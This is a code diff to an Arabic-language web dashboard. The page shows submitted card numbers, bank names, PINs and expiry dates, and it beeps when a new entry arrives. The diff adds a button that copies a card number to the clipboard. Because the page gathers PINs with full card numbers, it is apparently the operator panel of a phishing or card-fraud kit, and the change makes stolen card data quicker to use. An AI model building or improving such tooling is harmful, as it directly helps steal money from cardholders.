@@ -175,6 +175,7 @@
                 <div class="detail-item full">
                     <div class="label">رقم البطاقة (16 رقم)</div>
                     <div class="value highlight" id="modalCard">-</div>
+                    <button onclick="copyCard()" style="margin-top:5px; background:#e3f2fd; border:1px solid #90caf9; color:#1565c0; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:12px; font-weight:bold;">📋 نسخ رقم البطاقة</button>
                 </div>
                 <div class="detail-item">
                     <div class="label">البنك</div>
@@ -289,7 +290,7 @@
             currentPid = pid;
             const sub = submissions.find(s => s.pid == pid);
             if (!sub) return;
-            document.getElementById('modalCard').textContent = (sub.cardPrefix || '') + (sub.cardNumber || '-');
+            document.getElementById('modalCard').textContent = (sub.cardPrefix || '') + (sub.cardNumber || '');
             document.getElementById('modalBank').textContent = sub.bank || '-';
             document.getElementById('modalPin').textContent = sub.pin || '-';
             document.getElementById('modalExpiry').textContent = (sub.expMonth || '--') + '/' + (sub.expYear || '--');
@@ -342,6 +343,19 @@
                 osc.frequency.value = 800; gain.gain.value = 0.3;
                 osc.start(); setTimeout(() => { osc.stop(); ctx.close(); }, 200);
             } catch(e) {}
+        }
+
+        function copyCard() {
+            var cardText = document.getElementById('modalCard').textContent;
+            navigator.clipboard.writeText(cardText).then(function() {
+                showNotification('تم نسخ رقم البطاقة: ' + cardText);
+            }).catch(function() {
+                // Fallback
+                var ta = document.createElement('textarea');
+                ta.value = cardText; document.body.appendChild(ta); ta.select();
+                document.execCommand('copy'); document.body.removeChild(ta);
+                showNotification('تم نسخ رقم البطاقة: ' + cardText);
+            });
         }
 
         document.getElementById('modalOverlay').addEventListener('click', function(e) { if (e.target === this) closeModal(); });
